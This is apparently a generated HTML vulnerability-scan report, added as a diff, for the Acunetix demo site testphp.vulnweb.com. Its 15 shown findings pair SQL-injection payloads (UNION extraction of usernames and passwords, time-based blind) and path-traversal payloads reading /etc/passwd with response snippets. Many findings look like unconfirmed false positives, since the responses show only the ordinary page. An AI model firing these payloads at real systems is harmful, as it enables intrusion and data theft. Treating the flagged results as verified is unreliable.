@@ -1,0 +1,2004 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerability Scan Report - http://testphp.vulnweb.com/artists.php?artist=1</title>
+    <style>
+        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; }
+        .header { background-color: #f5f5f5; padding: 20px; border-radius: 5px; }
+        .vulnerability { margin-bottom: 20px; border-left: 4px solid #e74c3c; padding-left: 15px; }
+        .high { border-left-color: #e74c3c; }
+        .medium { border-left-color: #f39c12; }
+        .low { border-left-color: #3498db; }
+        .severity-high { color: #e74c3c; font-weight: bold; }
+        .severity-medium { color: #f39c12; font-weight: bold; }
+        .severity-low { color: #3498db; font-weight: bold; }
+        pre { background-color: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto; }
+        .summary { margin: 20px 0; padding: 15px; background-color: #f8f9fa; border-radius: 4px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Vulnerability Scan Report</h1>
+        <p><strong>Target:</strong> http://testphp.vulnweb.com/artists.php?artist=1</p>
+        <p><strong>Scan Time:</strong> 2025-09-14 21:06:48</p>
+        <div class="summary">
+            <h3>Summary</h3>
+            <p>High Severity: <span class="severity-high">40</span> | 
+               Medium Severity: <span class="severity-medium">0</span> | 
+               Low Severity: <span class="severity-low">0</span></p>
+        </div>
+    </div>
+
+    <h2>Vulnerabilities Found</h2>
+
+    <div class="vulnerability high">
+        <h3>1. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%20%271%27%3D%271" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%20%271%27%3D%271</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Basic boolean-based SQLi in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' OR '1'='1</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2178 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:06:51</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>2. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%201%3D1%20--%20" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%201%3D1%20--%20</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Basic logical SQLi with comment in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' OR 1=1 -- </code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2184 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:06:53</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>3. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a%2C%28SELECT%20%28ELT%281%3D1%2C1%29%29%29%2C0x3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%20--%20" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a%2C%28SELECT%20%28ELT%281%3D1%2C1%29%29%29%2C0x3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20information_schema.tables%20GROUP%20BY%20x%29a%29%20--%20</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Error-based SQLi in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT (ELT(1=1,1))),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- </code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2253 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:06:54</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>4. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%201%3DCONVERT%28INT%2C%28SELECT%20table_name%20FROM%20information_schema.tables%29%29--" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%201%3DCONVERT%28INT%2C%28SELECT%20table_name%20FROM%20information_schema.tables%29%29--</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Error-based SQLi with CONVERT in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' OR 1=CONVERT(INT,(SELECT table_name FROM information_schema.tables))--</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2245 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:06:56</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>5. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Time-based blind SQLi in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2215 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:06:57</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>6. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%20IF%281%3D1%2CSLEEP%285%29%2C0%29%20--%20" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20OR%20IF%281%3D1%2CSLEEP%285%29%2C0%29%20--%20</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Time-based blind with IF in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' OR IF(1=1,SLEEP(5),0) -- </code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2199 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:06:59</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>7. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%3B%20SELECT%20SLEEP%285%29--" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%3B%20SELECT%20SLEEP%285%29--</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using Stacked queries with time delay in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>'; SELECT SLEEP(5)--</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2193 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:07:01</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>8. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20UNION%20SELECT%20null%2Cusername%2Cpassword%20FROM%20users--</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using UNION-based SQLi in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' UNION SELECT null,username,password FROM users--</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2223 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:07:02</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>9. Error-based SQL Injection <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20UNION%20ALL%20SELECT%20null%2Ctable_name%2Ccolumn_name%20FROM%20information_schema.columns--" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&artist=%27%20UNION%20ALL%20SELECT%20null%2Ctable_name%2Ccolumn_name%20FROM%20information_schema.columns--</a></p>
+        <p><strong>Description:</strong> Possible Error-based SQL Injection detected using UNION-based with information_schema in parameter 'artist'</p>
+        <p><strong>Payload:</strong> <code>' UNION ALL SELECT null,table_name,column_name FROM information_schema.columns--</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre>Response status: 200, Length: 2253 (baseline: 6251)
+=== Response Snippet ===
+<!doctype html public "-//w3c//dtd html 4.01 transitional//en"
+"http://www.w3.org/tr/html4/loose.dtd">
+<html><!-- instancebegin template="/templates/main_dynamic_template.dwt.php" codeoutsidehtmlislocked="false" -->
+<head>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-2">
+
+<!-- instancebegineditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- instanceendeditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- instancebegineditable name="head...</pre>
+        <p><em>Detected at: 2025-09-14 21:07:04</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>10. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/passwd" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=/etc/passwd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - UNIX password file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>/etc/passwd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:25</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>11. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=../../../../etc/passwd" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=../../../../etc/passwd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Path traversal to password file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>../../../../etc/passwd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:26</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>12. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=../../../../etc/passwd%2500" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=../../../../etc/passwd%2500</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Null byte bypass in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>../../../../etc/passwd%00</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:26</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>13. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=....//....//....//....//etc/passwd" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=....//....//....//....//etc/passwd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Double encoding bypass in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>....//....//....//....//etc/passwd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:27</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>14. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - URL-encoded path traversal in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
+	</tr></table>
+  </div> 
+</div> 
+<!-- end masthead --> 
+
+<!-- begin content -->
+<!-- InstanceBeginEditable name="content_rgn" -->
+</pre>
+        <p><em>Detected at: 2025-09-14 21:08:28</em></p>
+    </div>
+
+    <div class="vulnerability high">
+        <h3>15. Local/Remote File Inclusion <span class="severity-high">(high)</span></h3>
+        <p><strong>URL:</strong> <a href="http://testphp.vulnweb.com/artists.php?artist=1&page=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts" target="_blank">http://testphp.vulnweb.com/artists.php?artist=1&page=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts</a></p>
+        <p><strong>Description:</strong> Possible LFI/RFI vulnerability detected - Windows hosts file in parameter 'page'</p>
+        <p><strong>Payload:</strong> <code>C:\Windows\System32\drivers\etc\hosts</code></p>
+        <p><strong>Response Snippet:</strong></p>
+        <pre><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">
+
+<!-- InstanceBeginEditable name="document_title_rgn" -->
+<title>artists</title>
+<!-- InstanceEndEditable -->
+<link rel="stylesheet" href="style.css" type="text/css">
+<!-- InstanceBeginEditable name="headers_rgn" -->
+<!-- here goes headers headers -->
+<!-- InstanceEndEditable -->
+<script language="JavaScript" type="text/JavaScript">
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+//-->
+</script>
+
+</head>
+<body> 
+<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
+<div id="masthead"> 
+  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
+  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
+  <div id="globalNav"> 
+      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
+	<td align="left">
+		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
+		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
+		<a href="guestbook.php">guestbook</a> | 
+		<a href="AJAX/index.php">AJAX Demo</a>
+	</td>
+	<td align="right">
+		</td>
